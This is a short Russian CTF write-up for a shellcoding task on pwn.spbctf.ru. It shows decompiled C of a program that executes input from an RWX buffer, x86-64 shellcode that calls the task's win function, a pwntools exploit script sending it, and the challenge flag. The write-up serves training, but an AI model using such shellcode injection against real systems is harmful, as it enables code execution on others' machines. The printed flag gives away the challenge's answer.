[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn4_call_fcn)
Описание:
Just call win_fcn and make it print flag for you
`nc 109.233.56.90 11668`
**[task](https://pwn.spbctf.ru/files/shellcoding/call_fcn/task)**

Программа читает 0x400 байт в сегмент памяти с правами RWX, а затем исполняет введённый код.
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE ptr[1024]; // [rsp+20h] [rbp-410h] BYREF
  void *dest; // [rsp+420h] [rbp-10h]
  int v6; // [rsp+42Ch] [rbp-4h]

  v6 = 0;
  dest = mmap(nullptr, 0x1000u, 7, 34, -1, 0); 
  fread(ptr, 0x400u, 1u, stdin);
  memcpy(dest, ptr, 0x400u);
  ((void (*)(void))dest)();
  
  return 1;
}
```

Шел-код:
``` nasm
BITS 64

mov rdi, 0x6010B0
mov dword [rdi], 0xCAFEBABE
mov rax, 0x4006B0
call rax

; \xbf\xb0\x10\x60\x00\xc7\x07\xbe\xba\xfe\xca\xb8\xb0\x06\x40\x00\xff\xd0
```

Эксплоит:
``` python
io = start()

payload = b'\xbf\xb0\x10\x60\x00\xc7\x07\xbe\xba\xfe\xca\xb8\xb0\x06\x40\x00\xff\xd0'.ljust(0x400, b'\x00')

io.sendline(payload)
io.interactive()
```

Запуск:
![](z.%20Images/{AC7C8C8F-48A2-464E-94AB-CEA20F69A07E}.png)

Ответ: `spbctf{w3l1_d0n3_e1be468edfa56b6370f0918dbdfc4170}`